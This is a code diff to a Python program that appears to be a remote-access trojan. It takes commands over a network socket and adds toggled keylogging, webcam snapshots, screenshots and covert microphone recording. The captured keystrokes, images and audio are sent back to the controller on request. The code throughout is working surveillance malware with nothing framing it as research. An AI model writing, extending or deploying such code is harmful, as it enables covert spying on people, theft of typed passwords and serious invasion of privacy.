@@ -9,6 +9,8 @@ import io
 from pynput import keyboard
 import threading
 import cv2
+from PIL import Image
+import pyaudio
 
 class App:
     def __init__(self):
@@ -17,7 +19,12 @@ class App:
         self.port = 5554
         self.socket = None
         self.listener = None
+        self.is_keylogger = False
+        self.mic_listener = None
+        self.pyaudio_listener = None
+        self.is_listeningmic = False
         self.keys_log = []
+        self.mic_frames = []
           
     def run(self):
         while self.running:
@@ -150,18 +157,28 @@ class App:
                 screenshot.save(img_bytes, format="PNG")
                 data = img_bytes.getvalue()
                 
-                header = f"IMG:{len(data)}"
+                header = f"IMG:{len(data)}:BYTES"
             except Exception as e:
                 text = "error while generating sceenshot : " + str(e)
                 
         elif cmd in ["keylogger", "keyslistener"]:
-            if args in ["ON", "on", "1", "true", "True"]:
-                thread0 = threading.Thread(target=self.listen_keys)
-                thread0.start()
-            elif args in ["OFF", "off", "0", "false", "False"]:
-                self.listener.stop()
-            elif args in ["get", "read", "getkeys"]:
-                text = "keys : " + "".join(self.keys_log)
+            try:
+                if args in ["ON", "on", "1", "true", "True"] and self.is_keylogger == False:
+                    thread0 = threading.Thread(target=self.listen_keys)
+                    thread0.start()
+                    self.is_keylogger = True
+                elif args in ["OFF", "off", "0", "false", "False"] and self.is_keylogger:
+                    self.listener.stop()
+                    self.is_keylogger = False
+                elif args in ["get", "read", "getkeys"]:
+                    data = ("".join(self.keys_log)).encode("utf-8")
+                    header = f"TEXTFILE:{len(data)}"
+                elif args in ["clear", "reset", "erase"]:
+                    self.keys_log = []
+                else:
+                    text = "keylogger command not found : " + args
+            except Exception as e:
+                text = "error while managing the keylogger : " + str(e)
                 
         elif input_ in ["snapshot", "getwebcam", "webcamcapture", "webcamsnapshot"]:
             try:
@@ -169,16 +186,36 @@ class App:
                 ret, frame = capture.read()
                 capture.release()
                 if ret:
-                    _, buffer = cv2.imencode(".png", frame)
-                    data = buffer.tobytes()
+                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                    pil_img = Image.fromarray(frame_rgb)
+
+                    img_bytes = io.BytesIO()
+                    pil_img.save(img_bytes, format="PNG")
+                    data = img_bytes.getvalue()
                     
-                    header = f"IMG:{len(data)}"
+                    header = f"IMG:{len(data)}:PIL"
                 else:
                     text = "couldn't take a snapshot ..."
             except Exception as e:
                 text = "error while taking snapshot : " + str(e)
             
-            
+        elif cmd in ["recordaudio", "getaudio", "record", "getmicrophone", "recordmicrophone"]:
+            try:
+                if args in ["ON", "on", "1", "true", "True"] and self.is_listeningmic == False:
+                    self.is_listeningmic = True
+                    thread1 = threading.Thread(target=self.listen_mic)
+                    thread1.start()
+                elif args in ["OFF", "off", "0", "false", "False"]and self.is_listeningmic:
+                    self.is_listeningmic = False
+                elif args in ["get", "read", "getaudio"]:
+                    data = b"".join(self.mic_frames)
+                    header = f"AUDIO:{len(data)}"
+                elif args in ["clear", "reset", "erase"]:
+                    self.mic_frames = []
+                else:
+                    text = "microphone listener command not found : " + args
+            except Exception as e:
+                text = "error while managing the microphone listener : " + str(e)
     
         elif input_ in ["exit", "ex", "/exit"]:
             self.running = False
@@ -209,6 +246,20 @@ class App:
     def listen_keys(self):
         self.listener = keyboard.Listener(on_press=self.on_press)
         self.listener.start()
+
+    def listen_mic(self):
+        self.pyaudio_listener = pyaudio.PyAudio()
+        self.mic_listener = self.pyaudio_listener.open(format=pyaudio.PaInt16, channels=1, rate=44100, 
+        input=True, frames_per_buffer=1024)
+        while self.is_listeningmic:
+            data = self.mic_listener.read(1024)
+            self.mic_frames.append(data)
+
+        self.mic_listener.stop_stream()
+        self.mic_listener.stop()
+        self.pyaudio_listener.terminate()
+
+        
     
 
 if __name__ == "__main__":
